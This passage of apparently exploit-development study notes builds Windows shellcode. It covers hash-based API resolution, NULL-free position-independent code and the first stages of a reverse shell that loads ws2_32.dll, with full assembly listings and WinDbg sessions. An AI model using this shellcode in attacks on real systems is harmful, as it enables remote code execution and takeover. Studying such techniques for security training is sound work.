- `LODSB` instruction will load a byte from the memory pointed to by `ESI` into the `AL` register and then automatically increment or decrement the register according to the `DF` flag.

- `TEST` instruction using the `AL` register as both operands.

    - If `AL` is `NULL`, take the `JZ` conditional jump to the `compute_hash_finished`.

    - If `AL` is not `NULL`, arrive at a `ROR` bit-wise operation. `EDX` is rotated right by `0x0D` bits.

Use `a @eip` register to place the `ROR` instruction right at the memory address where `EIP` is pointing to.

Next, type the assembly instruction `ror eax, 0x01`, and after pressing `Return` (`Enter`) twice, the instruction will be placed in memory.

`r @eax=0x41`

`a @eip`

`ror eax, 0x01`

`.formats @eax`

```
Evaluate expression:
  ...
  Binary:  00000000 00000000 00000000 01000001
  ...
```

`t`

`.formats @eax`

```
Evaluate expression:
  ...
  Binary:  10000000 00000000 00000000 00100000
  ...
```

After the rotate bits right instruction, `add edx, eax`, and jump to the beginning of `compute_hash_again`. (`eax` holds a byte of our symbol name)

This function represents a loop that will go over each byte of a symbol name and add it to an accumulator (`EDX`) right after the rotate bits right operation.

Once we reach the end of our symbol name, the `EDX` register will contain a unique 4-byte hash for that symbol name.

=> Compare it to a pre-generated hash to determine if we have found the correct entry.

Python script to compute a 4-byte hash from a **function name** that our shellcode will search for:

#### ComputeHash.py

```bat
python ComputeHash.py timeGetTime
```

```python
#!/usr/bin/python
import numpy, sys

def ror_str(byte, count):
    binb = numpy.base_repr(byte, 2).zfill(32)
    while count > 0:
        binb = binb[-1] + binb[0:-1]
        count -= 1
    return (int(binb, 2))

if __name__ == '__main__':
    try:
        esi = sys.argv[1]
    except IndexError:
        print("Usage: %s INPUTSTRING" % sys.argv[0])
        sys.exit()

    # Initialize variables
    edx = 0x00
    ror_count = 0

    for eax in esi:
        edx = edx + ord(eax)
        if ror_count < len(esi)-1:
            edx = ror_str(edx, 0xd)
        ror_count += 1

    print(hex(edx))
```

The `timeGetTime` string was the last symbol name exported by `kernel32.dll`.

```bat
python ComputeHash.py timeGetTime
```

`u @eip L18`

```
02a3002e 60              pushad
...
02a30043 e319            jecxz   02a3005e
02a30045 49              dec     ecx
02a30046 8b45fc          mov     eax,dword ptr [ebp-4]
02a30049 8b3488          mov     esi,dword ptr [eax+ecx*4]
02a3004c 01de            add     esi,ebx
02a3004e 31c0            xor     eax,eax
02a30050 99              cdq
02a30051 fc              cld
02a30052 ac              lods    byte ptr [esi]
02a30053 84c0            test    al,al
02a30055 7407            je      02a3005e
02a30057 c1ca0d          ror     edx,0Dh
02a3005a 01c2            add     edx,eax
02a3005c ebf4            jmp     02a30052
02a3005e 61              popad
02a3005f c3              ret
```

Set up 2 software breakpoints.

1. After obtaining the `RVA` to the first entry in the `AddressOfNames` array (`add esi,ebx`), allowing us to confirm the symbol name that will be hashed.

2. After our `compute_hash_again` function has finished executing, allowing us to view the resultant hash in `EDX`. (`add edx,eax`)

`bp 02a3004e` 

`bp 02a3005e`

`g`

```
02a3004e 31c0            xor     eax,eax
```

`da @esi`

```
76ec2af4  "timeGetTime"
```

`g`

```
02a3005e 61              popad
```

`r edx`

```
edx=998eaf95
```

The generated hash matches the one we obtained using our Python script.

Note: The `ROR` function in the script rotates bits using a string representation of a binary number due to the fact that it is simpler to visualize for the student.

A correct implementation would use shift and or bitwise operators combined together (`h<<5 | h>>27`). 

### Fetching the VMA of a Function

Search for the `TerminateProcess` symbol and obtain its `RVA` and `VMA` inside our shellcode.

The computed hash is stored in the `EDX` register.

=> Compare the hash from `EDX` with the one generated by our Python script `0x78b5b983`.

```bat
python ComputeHash.py TerminateProcess
```

If the hashes match, re-use the same index from `ECX` in the `AddressOfNameOrdinals` array and gather the new index. => obtain the `RVA` and, finally, `VMA` of the function.

`resolving_symbols_0x03.py`: Comparing the generated hash with the static one and fetching the function VMA

```python
...
CODE = (
    " start:                             "  #
    "   int3                            ;"  #   Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
    "   mov   ebp, esp                  ;"  #
    "   sub   esp, 0x200                ;"  #
    "   call  find_kernel32             ;"  #
    "   push  0x78b5b983                ;"  #   TerminateProcess hash
    "   call  find_function             ;"  #
    "   xor   ecx, ecx                  ;"  #   NULL ECX
    "   push  ecx                       ;"  #   uExitCode
    "   push  0xffffffff                ;"  #   hProcess
    "   call  eax                       ;"  #   Call TerminateProcess

    " find_kernel32:                     "  #
    "   xor   ecx, ecx                  ;"  #   ECX = 0
    "   mov   esi,fs:[ecx+0x30]         ;"  #   ESI = &(PEB) ([FS:0x30])
    "   mov   esi,[esi+0x0C]            ;"  #   ESI = PEB->Ldr
    "   mov   esi,[esi+0x1C]            ;"  #   ESI = PEB->Ldr.InInitOrder

    " next_module:                       "  #
    "   mov   ebx, [esi+0x08]           ;"  #   EBX = InInitOrder[X].base_address
    "   mov   edi, [esi+0x20]           ;"  #   EDI = InInitOrder[X].module_name
    "   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next)
    "   cmp   [edi+12*2], cx            ;"  #   (unicode) modulename[12] == 0x00 ?
    "   jne   next_module               ;"  #   No: try next module.
    "   ret                             ;"  #

    " find_function:                     "  #
    "   pushad                          ;"  #   Save all registers
                                            #   Base address of kernel32 is in EBX from 
                                            #   Previous step (find_kernel32)
    "   mov   eax, [ebx+0x3c]           ;"  #   Offset to PE Signature
    "   mov   edi, [ebx+eax+0x78]       ;"  #   Export Table Directory RVA
    "   add   edi, ebx                  ;"  #   Export Table Directory VMA
    "   mov   ecx, [edi+0x18]           ;"  #   NumberOfNames
    "   mov   eax, [edi+0x20]           ;"  #   AddressOfNames RVA
    "   add   eax, ebx                  ;"  #   AddressOfNames VMA
    "   mov   [ebp-4], eax              ;"  #   Save AddressOfNames VMA for later

    " find_function_loop:                "  #
    "   jecxz find_function_finished    ;"  #   Jump to the end if ECX is 0
    "   dec   ecx                       ;"  #   Decrement our names counter
    "   mov   eax, [ebp-4]              ;"  #   Restore AddressOfNames VMA
    "   mov   esi, [eax+ecx*4]          ;"  #   Get the RVA of the symbol name
    "   add   esi, ebx                  ;"  #   Set ESI to the VMA of the current symbol name

    " compute_hash:                      "  #
    "   xor   eax, eax                  ;"  #   NULL EAX
    "   cdq                             ;"  #   NULL EDX
    "   cld                             ;"  #   Clear direction

    " compute_hash_again:                "  #
    "   lodsb                           ;"  #   Load the next byte from esi into al
    "   test  al, al                    ;"  #   Check for NULL terminator
    "   jz    compute_hash_finished     ;"  #   If the ZF is set,we've hit the NULL term
    "   ror   edx, 0x0d                 ;"  #   Rotate edx 13 bits to the right
    "   add   edx, eax                  ;"  #   Add the new byte to the accumulator
    "   jmp   compute_hash_again        ;"  #   Next iteration

    " compute_hash_finished:             "  #

    " find_function_compare:             "  #
    "   cmp   edx, [esp+0x24]           ;"  #   Compare the computed hash with the requested hash
    "   jnz   find_function_loop        ;"  #   If it doesn't match go back to find_function_loop
    "   mov   edx, [edi+0x24]           ;"  #   AddressOfNameOrdinals RVA
    "   add   edx, ebx                  ;"  #   AddressOfNameOrdinals VMA
    "   mov   cx,  [edx+2*ecx]          ;"  #   Extrapolate the function's ordinal
    "   mov   edx, [edi+0x1c]           ;"  #   AddressOfFunctions RVA
    "   add   edx, ebx                  ;"  #   AddressOfFunctions VMA
    "   mov   eax, [edx+4*ecx]          ;"  #   Get the function RVA
    "   add   eax, ebx                  ;"  #   Get the function VMA
    "   mov   [esp+0x1c], eax           ;"  #   Overwrite stack version of eax from pushad

    " find_function_finished:            "  #
    "   popad                           ;"  #   Restore registers
    "   ret                             ;"  #
)
...
```

The `start` function:

- Before the call to `find_function`, push the hash `0x78b5b983` for `TerminateProcess` on the stack. => to later fetch it from the stack and compare it to the hash generated by our `compute_hash_again` function.

- After `find_function` returns, push the 2 arguments that the target function `TerminateProcess` requires on the stack, and call it using an indirect call to `EAX`. Place the `VMA` of `TerminateProcess` in `EAX` before returning from `find_function`.

`find_function_compare` function

- Makes a comparison between `EDX` and the value pointed to by `ESP` at offset `0x24`, i.e. the pre-generated hash we pushed.

- If the compared hashes don't match, jump back to `find_function_loop` and grab the next entry in the `AddressOfNames` array.

- Once we have found the correct entry, gather the `RVA` of the `AddressOfNameOrdinals` array at offset `0x24` from the `Export Directory Table`, which is stored in `EDI`.

- Adds the base address of `kernel32.dll` stored in `EBX` to the `RVA` of `AddressOfNameOrdinals`.

- The `mov cx, [edx+2*ecx]` instruction. Because the `AddressOfNames` and `AddressOfNameOrdinals` arrays entries use the same counter/index `ecx`. We multiply `ECX` by `0x02` because each entry in the array is a `WORD`.

- Before using the new index, we gather the `RVA` of `AddressOfFunctions` at offset `0x1C` from the `Export Directory Table` (`mov edx, [edi+0x1c]`), and then add the base address of `kernel32.dll` to it.

- Using our new index in the `AddressOfFunctions` array, retrieve the `RVA` of the function and then finally add the base address of `kernel32.dll` to obtain the `VMA` of the function.

Set a software breakpoint after the conditional jump inside `find_function_compare`:

`bp 02b40070` 

`g`

```
Breakpoint 0 hit
02b40070 8b5724          mov     edx,dword ptr [edi+24h] ds:0023:76eb5964=00078a70
```

`u @eip La`

```
02b40070 8b5724          mov     edx,dword ptr [edi+24h]
02b40073 01da            add     edx,ebx
02b40075 668b0c4a        mov     cx,word ptr [edx+ecx*2]
02b40079 8b571c          mov     edx,dword ptr [edi+1Ch]
02b4007c 01da            add     edx,ebx
02b4007e 8b048a          mov     eax,dword ptr [edx+ecx*4]
02b40081 01d8            add     eax,ebx
02b40083 8944241c        mov     dword ptr [esp+1Ch],eax
02b40087 61              popad
02b40088 c3              ret
```

`t`

```
02b40073 01da            add     edx,ebx
```

`t`

```
02b40083 8944241c        mov     dword ptr [esp+1Ch],eax ss:0023:02d3fd4c=fa5da212
```

`u @eax`

```
KERNEL32!TerminateProcessStub:
76e6bd30 8bff            mov     edi,edi
76e6bd32 55              push    ebp
76e6bd33 8bec            mov     ebp,esp
76e6bd35 5d              pop     ebp
76e6bd36 ff254c49ec76    jmp     dword ptr [KERNEL32!_imp__TerminateProcess (76ec494c)]
76e6bd3c cc              int     3
76e6bd3d cc              int     3
76e6bd3e cc              int     3
```

Our shellcode managed to successfully resolve the memory address of `TerminateProcess`.

The last instruction in `find_function_compare` will write this `VMA` to the stack at offset `0x1C`.

=> To ensure that our address will be popped back into `EAX` after executing the `POPAD` instruction that is a part of `find_function_finished` before returning to our start function.

Inspect the `TerminateProcess` function prototype:

```C
BOOL TerminateProcess(
  HANDLE hProcess,
  UINT   uExitCode
);
```

After the `RET` instruction is executed, we return to the `start` function where we:

- zero out `ECX` and push it onto the stack as the `uExitCode` parameter and represents a successful exit.

- pushes the value `-1` (`0xFFFFFFFF`) to the stack as the `hProcess` parameter. The minus one value represents a `pseudo-handle` to our process.

## NULL-Free Position-Independent Shellcode (PIC)

While our shellcode is functioning correctly, the opcodes it generates contain NULL bytes:

`u @eip L6`

```
02950000 cc              int     3
02950001 89e5            mov     ebp,esp
02950003 81ec00020000    sub     esp,200h
02950009 e811000000      call    0295001f
0295000e 6883b9b578      push    78B5B983h
02950013 e822000000      call    0295003a
```

Using this shellcode in a real exploit would be problematic as the NULL byte is usually a **bad character**.

### Avoiding NULL Bytes

Instructions that generated the `NULL` bytes: `sub esp, 0x200`

=> use a **negative offset value**, or a combination of multiple instructions that achieve the same effect

`? 0x0 - 0x210`

```
Evaluate expression: -528 = fffffdf0
```

`? @esp + 0xfffffdf0`

```
Evaluate expression: 4340382624 = 00000001`02b4fba0
```

`r @esp`

```
esp=02b4fdb0
```

`? 0x02b4fdb0 - 0x02b4fba0`

```
Evaluate expression: 528 = 00000210
```

Rather than using a `SUB` operation with a value of `0x200`, we can `ADD` a large offset and achieve a similar result.

make `ESP` hold a memory address that will not contain any `NULL` bytes.

```python
import ctypes, struct
from keystone import *

CODE = (
    " start:                             "  #
    "   int3                            ;"  #   Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
    "   mov   ebp, esp                  ;"  #
    "   add   esp, 0xfffffdf0           ;"  #   Avoid NULL bytes
    "   call  find_kernel32             ;"  #
    "   push  0x78b5b983                ;"  #   TerminateProcess hash
    "   call  find_function             ;"  #
...
```

Verify the opcodes do not contain `NULL` bytes:

`u @eip L6`

```
02210000 cc              int     3
02210001 89e5            mov     ebp,esp
02210003 81c4f0fdffff    add     esp,0FFFFFDF0h
02210009 e811000000      call    0221001f
0221000e 6883b9b578      push    78B5B983h
02210013 e822000000      call    0221003a
```

Our shellcode also contains `CALL` instructions, which generate `NULL` bytes.

### Position-Independent Shellcode

Our `CALL` instructions generate `NULL` bytes because our code is calling the functions directly.

Each direct function `CALL`, depending on the location of the function, will either invoke a

- **near call** containing a **relative offset** to the function, or

- **far call** containing the **absolute address**, either directly or with a pointer.

There are 2 ways we can address the `CALL` instructions.

1. Move all the functions being called above the `CALL` instruction. This would generate a **negative offset** and avoid `NULL` bytes.

2. Dynamically gather the absolute address of the function we want to call, and store it in a register.

The 2nd option provides more flexibility, especially for large shellcodes. This technique is often used by decoder components when the payload is encoded. The ability to gather the shellcode absolute address at runtime will provide us with a position independent code (PIC) shellcode that is both NULL-free and injectable anywhere in memory.

This technique exploits the fact that a call to a function located in a lower address will use a **negative offset** and therefore has a high chance of not containing `NULL` bytes. Moreover, when executing the CALL instruction, the return address will be pushed onto the stack. This address can be then popped from the stack into a register and be used to dynamically calculate the absolute address of the function we are interested in.

`resolving_symbols_0x04.py`: Obtaining the location of our shellcode in memory

```python
...
CODE = (
    " start:                             "  #
    "   int3                            ;"  #   Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
    "   mov   ebp, esp                  ;"  #
    "   add   esp, 0xfffffdf0           ;"  #   Avoid NULL bytes

    " find_kernel32:                     "  #
    "   xor   ecx, ecx                  ;"  #   ECX = 0
    "   mov   esi,fs:[ecx+0x30]         ;"  #   ESI = &(PEB) ([FS:0x30])
    "   mov   esi,[esi+0x0C]            ;"  #   ESI = PEB->Ldr
    "   mov   esi,[esi+0x1C]            ;"  #   ESI = PEB->Ldr.InInitOrder

    " next_module:                       "  #
    "   mov   ebx, [esi+0x08]           ;"  #   EBX = InInitOrder[X].base_address
    "   mov   edi, [esi+0x20]           ;"  #   EDI = InInitOrder[X].module_name
    "   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next)
    "   cmp   [edi+12*2], cx            ;"  #   (unicode) modulename[12] == 0x00 ?
    "   jne   next_module               ;"  #   No: try next module

    " find_function_shorten:             "  #
    "   jmp find_function_shorten_bnc   ;"  #   Short jump

    " find_function_ret:                 "  #
    "   pop esi                         ;"  #   POP the return address from the stack
    "   mov   [ebp+0x04], esi           ;"  #   Save find_function address for later usage
    "   jmp resolve_symbols_kernel32    ;"  #

    " find_function_shorten_bnc:         "  #   
    "   call find_function_ret          ;"  #   Relative CALL with negative offset

    " find_function:                     "  #
    "   pushad                          ;"  #   Save all registers
                                            #   Base address of kernel32 is in EBX from 
                                            #   Previous step (find_kernel32)
    "   mov   eax, [ebx+0x3c]           ;"  #   Offset to PE Signature
    "   mov   edi, [ebx+eax+0x78]       ;"  #   Export Table Directory RVA
    "   add   edi, ebx                  ;"  #   Export Table Directory VMA
    "   mov   ecx, [edi+0x18]           ;"  #   NumberOfNames
    "   mov   eax, [edi+0x20]           ;"  #   AddressOfNames RVA
    "   add   eax, ebx                  ;"  #   AddressOfNames VMA
    "   mov   [ebp-4], eax              ;"  #   Save AddressOfNames VMA for later

    " find_function_loop:                "  #
    "   jecxz find_function_finished    ;"  #   Jump to the end if ECX is 0
    "   dec   ecx                       ;"  #   Decrement our names counter
    "   mov   eax, [ebp-4]              ;"  #   Restore AddressOfNames VMA
    "   mov   esi, [eax+ecx*4]          ;"  #   Get the RVA of the symbol name
    "   add   esi, ebx                  ;"  #   Set ESI to the VMA of the current symbol name

    " compute_hash:                      "  #
    "   xor   eax, eax                  ;"  #   NULL EAX
    "   cdq                             ;"  #   NULL EDX
    "   cld                             ;"  #   Clear direction

    " compute_hash_again:                "  #
    "   lodsb                           ;"  #   Load the next byte from esi into al
    "   test  al, al                    ;"  #   Check for NULL terminator
    "   jz    compute_hash_finished     ;"  #   If the ZF is set, we've hit the NULL term
    "   ror   edx, 0x0d                 ;"  #   Rotate edx 13 bits to the right
    "   add   edx, eax                  ;"  #   Add the new byte to the accumulator
    "   jmp   compute_hash_again        ;"  #   Next iteration

    " compute_hash_finished:             "  #

    " find_function_compare:             "  #
    "   cmp   edx, [esp+0x24]           ;"  #   Compare the computed hash with the requested hash
    "   jnz   find_function_loop        ;"  #   If it doesn't match go back to find_function_loop
    "   mov   edx, [edi+0x24]           ;"  #   AddressOfNameOrdinals RVA
    "   add   edx, ebx                  ;"  #   AddressOfNameOrdinals VMA
    "   mov   cx,  [edx+2*ecx]          ;"  #   Extrapolate the function's ordinal
    "   mov   edx, [edi+0x1c]           ;"  #   AddressOfFunctions RVA
    "   add   edx, ebx                  ;"  #   AddressOfFunctions VMA
    "   mov   eax, [edx+4*ecx]          ;"  #   Get the function RVA
    "   add   eax, ebx                  ;"  #   Get the function VMA
    "   mov   [esp+0x1c], eax           ;"  #   Overwrite stack version of eax from pushad

    " find_function_finished:            "  #
    "   popad                           ;"  #   Restore registers
    "   ret                             ;"  #

    " resolve_symbols_kernel32:              "
    "   push  0x78b5b983                ;"  #   TerminateProcess hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x10], eax           ;"  #   Save TerminateProcess address for later usage

    " exec_shellcode:                    "  #
    "   xor   ecx, ecx                  ;"  #   NULL ECX
    "   push  ecx                       ;"  #   uExitCode
    "   push  0xffffffff                ;"  #   hProcess
    "   call dword ptr [ebp+0x10]       ;"  #   Call TerminateProcess
)
...
```

Modified `start` function:

- Go directly into the `find_kernel32` function without using a `CALL` instruction.

After obtaining the base address of `kernel32.dll`, reach the newly added functions which will gather the position of our shellcode in memory.

`find_function_shorten` function contains a single assembly instruction, which is a short jump to `find_function_shorten_bnc`.

Because these functions are close to each other, the `JMP` instruction's opcodes will not contain `NULL` bytes.

```python
    " find_function_shorten:             "  #
    "   jmp find_function_shorten_bnc   ;"  #   Short jump

    " find_function_ret:                 "  #
    "   pop esi                         ;"  #   POP the return address from the stack
    "   mov   [ebp+0x04], esi           ;"  #   Save find_function address for later usage
    "   jmp resolve_symbols_kernel32    ;"  #

    " find_function_shorten_bnc:         "  #   
    "   call find_function_ret          ;"  #   Relative CALL with negative offset

    " find_function:                     "  #
    "   pushad                          ;"  #   Save all registers
```

`find_function_shorten_bnc` function:

- A `CALL` instruction with `find_function_ret` as the destination.

- Because this function is located higher than our `CALL` instruction, the generated opcodes will contain a **negative offset** that should be free of `NULL` bytes.

After we execute this `CALL` instruction, we will push the **return address** to the stack. The stack will point to `find_function`'s 1st instruction.

`find_function_ret` function:

- The 1st instruction is a `POP`, which takes the return value we pushed on the stack and places it in `ESI`. `ESI` will point to the first instruction of `find_function`, allowing us to use an indirect call to invoke it.

- This address is then saved at a dereference of `EBP` at offset `0x04` for later use.

```python
...
    " find_function_finished:            "  #
    "   popad                           ;"  #   Restore registers
    "   ret                             ;"  #

    " resolve_symbols_kernel32:              "
    "   push  0x78b5b983                ;"  #   TerminateProcess hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x10], eax           ;"  #   Save TerminateProcess address for later usage

    " exec_shellcode:                    "  #
    "   xor   ecx, ecx                  ;"  #   Null ECX
    "   push  ecx                       ;"  #   uExitCode
    "   push  0xffffffff                ;"  #   hProcess
    "   call dword ptr [ebp+0x10]       ;"  #   Call TerminateProcess
```

Moving the functions requires us to move the assembly code responsible for calling `find_function` to resolve symbols and execute the APIs after `find_function_finished`.

Setting a breakpoint right at `find_function_shorten`. Once hit, we will take the jump and reach `find_function_shorten_bnc`:

`g`

```
02900000 cc              int     3
```

`u @eip L10`

```
...
02900023 eb06            jmp     0290002b
02900025 5e              pop     esi
02900026 897504          mov     dword ptr [ebp+4],esi
02900029 eb54            jmp     0290007f
```

`bp 02900023`

`g`

```
Breakpoint 0 hit
02900023 eb06            jmp     0290002b
```

`t`

```
0290002b e8f5ffffff      call    02900025
```

The `CALL` instruction does not contain any NULL bytes due to the negative offset.

Stepping into the call will push the return instruction on the stack. Let's confirm that the return address points to `find_function`.

`t`

```
02900025 5e              pop     esi
```

`dds @esp L1`

```
02aff95c  02900030
```

`u poi(@esp)`

```
02900030 60              pushad
02900031 8b433c          mov     eax,dword ptr [ebx+3Ch]
02900034 8b7c0378        mov     edi,dword ptr [ebx+eax+78h]
02900038 01df            add     edi,ebx
0290003a 8b4f18          mov     ecx,dword ptr [edi+18h]
0290003d 8b4720          mov     eax,dword ptr [edi+20h]
02900040 01d8            add     eax,ebx
02900042 8945fc          mov     dword ptr [ebp-4],eax
```

The return address is pushed to the stack and points to the 1st instruction of `find_function`.

The next two instructions will `POP` the address of `find_function` into `ESI`, and save it at the memory location pointed to by `EBP` at offset `0x04`.

`t`

```
02900026 897504          mov     dword ptr [ebp+4],esi ss:0023:02affb74=00000000
```

`u @esi`

```
02900030 60              pushad
02900031 8b433c          mov     eax,dword ptr [ebx+3Ch]
02900034 8b7c0378        mov     edi,dword ptr [ebx+eax+78h]
02900038 01df            add     edi,ebx
0290003a 8b4f18          mov     ecx,dword ptr [edi+18h]
0290003d 8b4720          mov     eax,dword ptr [edi+20h]
02900040 01d8            add     eax,ebx
02900042 8945fc          mov     dword ptr [ebp-4],eax
```

`t`

```
02900029 eb54            jmp     0290007f
```

`u poi(@ebp + 0x04)`

```
02900030 60              pushad
02900031 8b433c          mov     eax,dword ptr [ebx+3Ch]
02900034 8b7c0378        mov     edi,dword ptr [ebx+eax+78h]
02900038 01df            add     edi,ebx
0290003a 8b4f18          mov     ecx,dword ptr [edi+18h]
0290003d 8b4720          mov     eax,dword ptr [edi+20h]
02900040 01d8            add     eax,ebx
02900042 8945fc          mov     dword ptr [ebp-4],eax
```

The last instruction of `find_function_ret` is a short jump to the `resolve_symbols_kernel32` function, where we use an **indirect call** to avoid NULL bytes:

`t`

```
0290007f 6883b9b578      push    78B5B983h
```

`t`

```
02900084 ff5504          call    dword ptr [ebp+4]    ss:0023:02affb74=02900030
```

`p`

```
02900087 894510          mov     dword ptr [ebp+10h],eax ss:0023:02affb80=02affbc8
```

`u @eax`

```
KERNEL32!TerminateProcessStub:
76e6bd30 8bff            mov     edi,edi
76e6bd32 55              push    ebp
76e6bd33 8bec            mov     ebp,esp
76e6bd35 5d              pop     ebp
76e6bd36 ff254c49ec76    jmp     dword ptr [KERNEL32!_imp__TerminateProcess (76ec494c)]
76e6bd3c cc              int     3
76e6bd3d cc              int     3
76e6bd3e cc              int     3
```

The indirect call does not contain any `NULL` bytes.

## Reverse Shell

Publicly-available reverse shells written in C reveales most of the required APIs are exported by `Ws2_32.dll`.

- Initialize the Winsock DLL using `WSAStartup`.
- Call `WSASocketA` to create the socket,
- Call `WSAConnect` to establish the connection.
- Call `CreateProcessA` from `kernel32.dll`. This API will start `cmd.exe`.

### Loading ws2_32.dll and Resolving Symbols

- Resolve the `CreateProcessA` API (which is exported by `kernel32.dll`) and store the address for later use.

- Load `ws2_32.dll` into the shellcode memory space and obtain its base address. Both of these tasks can be achieved using `LoadLibraryA`, which is exported by `kernel32.dll`.

To resolve symbols from `ws2_32.dll`, we could use the `GetProcAddress` API from `kernel32.dll` or simply reuse the functions that we have implemented previously. The only requirement is that the base address of the module needs to be in the `EBX` register, so that `RVA` can be translated to `VMA`.

Modify our current shellcode to load `ws2_32.dll` and resolve `LoadLibraryA` and `CreateProcessA` as part of the `resolve_symbols_kernel32` function

```python
    " find_function_finished:            "  #
    "   popad                           ;"  #   Restore registers
    "   ret                             ;"  #

    " resolve_symbols_kernel32:          "
    "   push  0x78b5b983                ;"  #   TerminateProcess hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x10], eax           ;"  #   Save TerminateProcess address for later usage
    "   push  0xec0e4e8e                ;"  #   LoadLibraryA hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x14], eax           ;"  #   Save LoadLibraryA address for later usage
    "   push  0x16b3fe72                ;"  #   CreateProcessA hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x18], eax           ;"  #   Save CreateProcessA address for later usage
...
```

Set up the call to `LoadLibraryA` (`ws2_32.dll` == `0x7773325f33322e646c6c`)

```python
    " resolve_symbols_kernel32:
    ...

    " load_ws2_32:                       "  #
    "   xor   eax, eax                  ;"  #   Null EAX
    "   mov   ax, 0x6c6c                ;"  #   Move the end of the string in AX
    "   push  eax                       ;"  #   Push EAX on the stack with string NULL terminator
    "   push  0x642e3233                ;"  #   Push part of the string on the stack
    "   push  0x5f327377                ;"  #   Push another part of the string on the stack
    "   push  esp                       ;"  #   Push ESP to have a pointer to the string
    "   call dword ptr [ebp+0x14]       ;"  #   Call LoadLibraryA
```

- Set `EAX` to `NULL`.
- Move the end of the `ws2_32.dll` string to the `AX` register and push it to the stack. This ensures that our string will be `NULL` terminated, while avoiding `NULL` bytes in our shellcode.
- After 2 more `PUSH` instructions, the entire string is pushed to the stack.
- Pushes the stack pointer (`ESP`) to the stack. Because `LoadLibraryA` requires a pointer to the string that is currently located on the stack.
- Call `LoadLibraryA` and proceed into the `resolve_symbols_ws2_32` function.

```python
    " load_ws2_32:
    ...

    " resolve_symbols_ws2_32:            "
    "   mov   ebx, eax                  ;"  #   Move the base address of ws2_32.dll to EBX
    "   push  0x3bfcedcb                ;"  #   WSAStartup hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x1C], eax           ;"  #   Save WSAStartup address for later usage
...
```

The return value of `LoadLibraryA` is a **handle** to the module specified as an argument. This handle comes in the form of the **base address** of the module. If the call to `LoadLibraryA` is successful, then we should have the base address of `ws2_32.dll` in the `EAX` register.

`load_ws2_32` function:
- Set the `EBX` register to the base address of `ws2_32.dll`.
- Resuses our `find_function` implementation to resolve symbols from `ws2_32.dll`.

With the base address of `ws2_32.dll` in EBX, push the individual hashes for every required symbol. i.e. `WSAStartup` and call `find_function` to resolve them.

Set breakpoint at the 1st instruction of the `load_ws2_32` function:

`g`

```
026000a0 31c0            xor     eax,eax
```

Proceed to single step through the instructions until we reach the call to `LoadLibraryA`.

Before stepping over the call, verify the first argument pushed on the stack:

`r`

```
026000b2 ff5514          call    dword ptr [ebp+14h]  ss:0023:027fff40={KERNEL32!LoadLibraryAStub (76e6a5c0)}
```

`da poi(esp)`

```
027ffd04  "ws2_32.dll"
```

`p`

```
026000b5 89c3            mov     ebx,eax
```

`r @eax`

```
eax=75070000
```

`lm m ws2_32`

```
Browse full module list
start    end        module name
75070000 750cb000   WS2_32     (deferred)            
```

Our argument is set up correctly before the call to `LoadLibraryA`.

After we step over the call, notice that `ws2_32.dll` is now loaded in the memory space of our shellcode, and `EAX` contains its base address.

Ensure that our `find_function` implementation works with `ws2_32.dll`.

Hash of `WSAStartup` is `0x3bfcedcb`

`t`

```
026000b7 68cbedfc3b      push    3BFCEDCBh
```

`t`

```
026000bc ff5504          call    dword ptr [ebp+4]    ss:0023:027fff30=02600030
```

`p`

```
026000bf 89451c          mov     dword ptr [ebp+1Ch],eax ss:0023:027fff48=cacdbf08
```

`u @eax`

```
WS2_32!WSAStartup:
750825e0 8bff            mov     edi,edi
750825e2 55              push    ebp
750825e3 8bec            mov     ebp,esp
750825e5 6afe            push    0FFFFFFFEh
750825e7 6898fb0a75      push    offset WS2_32!StringCopyWorkerW+0x2fc (750afb98)
750825ec 6850680875      push    offset WS2_32!_except_handler4 (75086850)
750825f1 64a100000000    mov     eax,dword ptr fs:[00000000h]
750825f7 50              push    eax
```

Our `find_function` implementation works correctly, even when using a different DLL.

### Calling WSAStartup

The 1st API we need to call is `WSAStartup` to initiate the use of the Winsock DLL by our shellcode.

```C
int WSAStartup(
  WORD      wVersionRequired,
  LPWSADATA lpWSAData
);
```

The 1st parameter appears to be the version of the Windows Sockets specification. Set this parameter to `2.2`.

The 2nd parameter is a pointer to the `WSADATA` structure. This structure will receive details about the Windows Sockets implementation. We need to reserve space for this structure

=> Discover its **length** by going over its prototype and inspecting the size of each structure member.

```C
typedef struct WSAData {
  WORD           wVersion;
  WORD           wHighVersion;
#if ...
  unsigned short iMaxSockets;
#if ...
  unsigned short iMaxUdpDg;
#if ...
  char           *lpVendorInfo;
#if ...
  char           szDescription[WSADESCRIPTION_LEN + 1];
#if ...
  char           szSystemStatus[WSASYS_STATUS_LEN + 1];
#else
  char           szDescription[WSADESCRIPTION_LEN + 1];
#endif
#else
  char           szSystemStatus[WSASYS_STATUS_LEN + 1];
#endif
#else
  unsigned short iMaxSockets;
#endif
#else
  unsigned short iMaxUdpDg;
#endif
#else
  char           *lpVendorInfo;
#endif
} WSADATA;
```

Reviewing the structure definition and information on the Microsoft website (`https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-wsadata`), note that some of the members are no longer used if the version is higher than `2.0`.

While most of the fields have defined lengths, there are a couple that remain problematic such as the `szDescription` and `szSystemStatus` fields.

According to the official documentation, `szDescription` can have a maximum length of `257` (`WSADESCRIPTION_LEN`, which is `256` plus the string `NULL` terminator).

Unfortunately, there is no mention of the length of the `szSystemStatus` field.

There are 2 ways to determine the length of this field:

- Code the socket in C and then inspect the structure inside WinDbg, or

- Use online resources to determine the size of this field. E.g., the source code of **ReactOS**.

ReactOS is an open-source OS designed to run Windows software and drivers. It uses a large number of structures that come from reverse-engineering older versions of the Windows OS.

